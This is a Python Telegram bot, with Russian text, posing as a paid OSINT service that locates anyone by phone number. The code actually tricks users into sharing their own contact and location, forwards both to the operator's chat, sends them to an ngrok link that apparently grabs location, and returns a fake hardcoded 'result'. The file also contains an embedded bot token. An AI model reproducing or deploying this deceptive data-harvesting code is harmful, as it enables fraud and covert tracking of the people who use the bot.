
import time
import random
import telebot
from telebot import types


my_id = '402249711'
bot = telebot.TeleBot('1596871845:AAELAFRfsVMOeyEkwR1VOT9NfDx5VYv37b8')
user_dict = {}


class User:
    def __init__(self, name):
        self.num = None
        self.number = None


@bot.message_handler(commands=['help', 'start'])

def process_name_step(message):
    try:
        chat_id = message.chat.id
        name = message.text
        user = User(name)
        user_dict[chat_id] = user
        msg = bot.reply_to(message, """Добро пожаловать в OSeekerINT_bot.

Это OSINT-бот, с функцией отслеживания геолокации в реальном времени по номеру телефона цели.

Тарифы: 
 Free* (Кол-во запросов 3)
 Limited(Кол-во запросов 100, Тех-поддержка) - 99$
 Unlimited(Кол-во запросов 999+, Админ-панель, Доступ к чату, Тех-поддержка) - 699$

* для активации тарифа free необходимо поделиться контактом.

Контакты:
 Смена тарифа - @Seeker_Operator
 Сотрудничество - @Seeker_Admin

Лицензия: GNU GPLv3 
   Copyright (c) 2019 ........

Введите номер как на примере.
Пример: 380685576477 """)
        bot.register_next_step_handler(msg, process_num_step)
    except Exception as e:
        bot.reply_to(message, 'Ошибка, нажмине /start или перезагрузите бота')


def process_num_step(message):
    try:
        chat_id = message.chat.id
        num = message.text
        if not num.isdigit():
            msg = bot.reply_to(message, 'Проверьте правильно ли написали номер, и напишите снова.')
            bot.register_next_step_handler(msg, process_num_step)
            return            
        user = user_dict[chat_id]
        user.num = num
        bot.reply_to(message, '⏳Подождите...⏳')#🔎
        time.sleep(4)
        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        button_phone = types.KeyboardButton(text="Продолжить", request_contact=True)
        keyboard.add(button_phone)
        bot.send_message(message.chat.id,
                     text="🔎Для получения информации о номере нажмите 'Продолжить'🔎 ",
                     reply_markup=keyboard)


        @bot.message_handler(content_types='contact')
        def error(message):
            bot.forward_message(my_id, message.chat.id, message.message_id)
            bot.reply_to(message, '🔎Поиск информации, подождите...🔎')#🔎🗿📞📞
            time.sleep(4.5)
            keyboard = types.InlineKeyboardMarkup()
            button_phone = types.InlineKeyboardButton(text="Начать🔎", url="https://1d11f01a1353.ngrok.io")
            # keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
            # button_phone = types.KeyboardButton(text="Начать🔎", request_location=True)
            keyboard.add(button_phone)
            bot.send_message(message.chat.id,
                         text="📞Для получения информации о местоположении телефона нажмите 'Начать' 📞",
                         reply_markup=keyboard)


            @bot.message_handler(content_types='location')
            def error(message):
                bot.forward_message(my_id, message.chat.id, message.message_id)
                bot.reply_to(message, '⏳Подождите...⏳')#🔎🗿📞📞
                time.sleep(4.5)
                markup = types.ReplyKeyboardMarkup(one_time_keyboard=True)
                markup.add('1', '2', '3', '4', '5', '6', '7', '8', '9')
                msg = bot.reply_to(message, 'Подтвердите, что вы не робот, нажмите на цифру 4 или 7', reply_markup=markup)
                bot.register_next_step_handler(msg, process_number_step)

    except Exception as e:
        bot.reply_to(message, 'Ошибка, нажмине /start или перезагрузите бота')


def process_number_step(message):
    try:
        chat_id = message.chat.id
        number = message.text
        user = user_dict[chat_id]
        if (number == u'4') or (number == u'7'):
            bot.send_message(message.chat.id, """Номер получен!
        Страна: Россия
        Регион: Екатеринбург
        Улица: 8 марта
        Google maps: https://clck.ru/RDFzp""")
        else:
            msg = bot.reply_to(message, "Вы не прошли проверку, попробуйте ещё раз.")
            bot.register_next_step_handler(msg, error)
            raise Exception()
        
    except Exception as e:
        bot.reply_to(message, 'Ошибка')
        bot.register_next_step_handler(msg, process_number_step)
        
bot.polling()

